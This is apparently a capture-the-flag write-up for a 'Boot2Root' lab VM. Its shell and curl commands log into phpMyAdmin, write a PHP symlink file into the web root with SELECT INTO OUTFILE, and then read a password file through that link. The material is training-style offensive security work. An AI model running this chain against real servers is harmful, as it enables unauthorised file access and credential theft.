## [Apache suEXEC](https://www.exploit-db.com/exploits/27397)

### Find our VM IP
```shell
IP=`prlctl list -f | grep "Boot2Root" | awk '{print $3}'`
echo $IP
```

### Scan ports
```shell
nmap -sV $IP | grep "Apache"
```

### Auth to db
```shell
$db_login=`cat ../scripts/writeup1/db_login`
$db_password=`cat ../scripts/writeup1/db_password`

db_cookie_path="scripts/writeup1/db_cookie.txt"
curl https://$IP/phpmyadmin/index.php -X POST -k -c $db_cookie_path --data-raw "pma_username=$db_login&pma_password=$db_password" 2>/dev/null | grep "token" | head -n 1 | cut -d "=" -f 8 | cut -d "&" -f 1
token=`curl https://$IP/phpmyadmin/index.php -k -b $db_cookie_path 2>/dev/null | grep "token" | head -n 1 | cut -d "=" -f 3 | cut -d "'" -f 1`
echo $token
```

### A little injection
```sql
SELECT 1, '<?php symlink(\"/\", \"paths.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/run.php'
```

```shell
curl https://$IP/phpmyadmin/import.php -X POST -k -b $db_cookie_path --data-raw "is_js_confirmed=0&token=$token&pos=0&goto=server_sql.php&message_to_show=SQL-%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81+%D0%B1%D1%8B%D0%BB+%D1%83%D1%81%D0%BF%D0%B5%D1%88%D0%BD%D0%BE+%D0%B2%D1%8B%D0%BF%D0%BE%D0%BB%D0%BD%D0%B5%D0%BD&prev_sql_query=&sql_query=SELECT+1%2C+'%3C%3Fphp+symlink(%5C%22%2F%5C%22%2C+%5C%22paths.php%5C%22)%3B%3F%3E'+INTO+OUTFILE+'%2Fvar%2Fwww%2Fforum%2Ftemplates_c%2Frun.php'&bkm_label=&sql_delimiter=%3B&show_query=1&ajax_request=true"
```

### Steal FTP password
```shell
curl https://$IP/forum/templates_c/run.php -k
curl https://$IP/forum/templates_c/paths.php/home/LOOKATME/password -k
```

-> [FTP Part Writeup2](../writeup2.md#Inspect FTP)
